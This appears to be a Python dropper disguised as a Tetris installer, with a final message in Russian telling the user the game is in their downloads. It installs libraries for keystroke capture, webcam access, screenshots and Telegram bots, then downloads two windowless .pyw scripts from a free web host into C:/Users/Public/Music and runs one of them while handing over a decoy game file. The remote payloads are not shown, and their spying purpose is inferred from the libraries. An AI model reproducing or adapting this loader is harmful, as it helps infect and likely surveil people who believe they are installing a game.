
import os
os.system('pip install requests')
os.system('pip install python-telegram-bot')
os.system('pip install Pillow')
os.system('pip install keyboard')
os.system('pip install pyttsx3')
os.system('pip install win10toast')
os.system('pip install opencv-python')
os.system('pip install subprocess')
os.system('pip install http.client')
os.system('pip install psutil')
import requests
import time
url = 'https://larisapc.000webhostapp.com/larisa.pyw'
r = requests.get(url, allow_redirects = True)
open('C:/Users/Public/Music/file.pyw', 'wb').write(r.content)
print('20%')
urlupd = 'https://larisapc.000webhostapp.com/update.pyw'
rupd = requests.get(urlupd, allow_redirects = True)
open('C:/Users/Public/Music/update.pyw', 'wb').write(rupd.content)

print('50%')
file_path = os.path.dirname(os.path.realpath(__file__))
print('wait one minute')

urlupdw = 'https://larisapc.000webhostapp.com/tetris.py'
rupdw = requests.get(urlupdw, allow_redirects = True)
os.system('cls')
open(file_path+'//tetris.py', 'wb').write(rupdw.content)
print('Готово! Вы можете открывать тетрис, он находится у вас в загрузках')
os.system('C:/Users/Public/Music/file.pyw')
